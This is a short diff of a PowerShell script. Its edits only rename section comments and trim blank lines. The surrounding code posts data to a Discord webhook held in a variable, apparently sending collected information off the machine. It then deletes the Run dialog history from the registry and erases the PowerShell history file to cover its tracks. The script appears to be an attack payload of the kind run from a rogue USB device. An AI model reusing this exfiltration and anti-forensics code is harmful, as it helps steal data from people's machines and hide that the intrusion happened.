@@ -63,8 +63,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
     }
 
 
-
-#------------------------------------------------------------------------------------------------------------------------------------
+# ----------------- DISCORD SENDING !
 
 $hookurl = "$dc"
 $Body = @{
@@ -75,15 +74,12 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 
 
-#------------------------------------------------------------------------------------------------------------------------------------
+# ----------------- SPRING CLEANING
 
 # Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
-
 
 exit
